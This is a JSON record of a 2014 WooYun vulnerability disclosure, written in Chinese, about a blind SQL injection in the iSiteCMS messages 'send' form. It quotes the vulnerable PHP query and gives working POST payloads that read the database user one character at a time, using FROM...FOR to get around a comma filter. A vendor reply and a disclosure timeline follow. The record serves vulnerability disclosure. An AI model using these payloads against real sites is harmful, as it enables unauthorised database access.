{"id": 58126, "wybug_id": "wooyun-2014-052248", "wybug_title": "iSiteCMS最新版本曲折的sql注射漏洞", "wybug_corp": "kometo.com", "wybug_author": "寂寞的瘦子", "wybug_date": "2014-02-28 17:17", "wybug_open_date": "2014-04-14 17:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-14：\t细节向公众公开  简要描述： 感谢小伙伴为我提供的手工技巧~~ 详细说明：  在/iSite 2.0 RC1 B684/isite/components/messages/messages.fe.php第86行\nif($form->status == TFORM_STATUS_GETED_VALID){//接受提交的表单参数      $arr = $form->getValues();      $tos = explode(',',trim($arr['to']));//把member用逗号分割了有木有啊      $noExistsMenber = array();      $toMenbers = array();      foreach ($tos as $menber){//把数组遍历出来        $i =        $this->DBE->getOne(\"select `id` from #__user where `name`='$menber'\");//带入查询了        if(is_null($i) or empty($i)){          $noExistsMenber[] = $menber;        }else{          $m['name'] = $menber;          $m['id']  = $i;          $toMenbers[] = $m;\n这个漏洞应该是被提到过的，但是厂商没有重视 WooYun: iSiteCMS发布安全补丁后仍然有几处注射漏洞（源码详析+实站演示） 厂商的回复是这个漏洞属于别人二次开发的，那么请你们仔细看看是不是你们开发~~的确把逗号给截断是件痛苦的事情，但是难不到小伙伴勤劳的双手~~   漏洞证明：  PS:你们的debug真的做的很好，无法使用原来洞主的那种方法，而且第二个洞也补了~~我们先要注册一个会员，然后在http://127.0.0.1/site/index.php?igo=iss,messages,send发送信息看我如何来盲注（我本地的user()是root@127.0.0.1，Post过去的to的值必须是存在的用户，不然语句永远为假）\nPost：to=test' and (select substring(user() from 2 for 1)='r')=1#&subject=1&content=1&submit=%B7%A2%CB%CD&__issForm%5B__referer%5D=http%3A%2F%2F127.0.0.1%2Fsite%2Findex.php%3Figo%3Diss%2Cmessages&__issForm%5B__name%5D=message\n这一句为真mysql日志的执行的语句是：\nselect `id` from flexi_user where `name`='test' and (select substring(user() from 1 for 1)='r')=1#'\n 这一句为真我们看看实际效果\n\n提示发送成功，为真那么我们看看为假的时候返回执行\nPost：to=test' and (select substring(user() from 1 for 1)='a')=1#&subject=1&content=1&submit=%B7%A2%CB%CD&__issForm%5B__referer%5D=http%3A%2F%2F127.0.0.1%2Fsite%2Findex.php%3Figo%3Diss%2Cmessages&__issForm%5B__name%5D=message\n\n\n因为语句为假所以返回用户名不存在，于是我们可以通过返回真假进行盲注。   修复方案：  我自己测试的截图，\n\n\n\n\n\n顺利通过提示的发送成功读取出用户名前面4位的值是rootPS:from for 好帅，可以逃脱逗号哟   版权声明：转载请注明来源 寂寞的瘦子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2014-03-04 14:56 厂商回复： 感谢指出，我们将尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-04 16:07 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @慧星网络科技 呵呵，低危    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}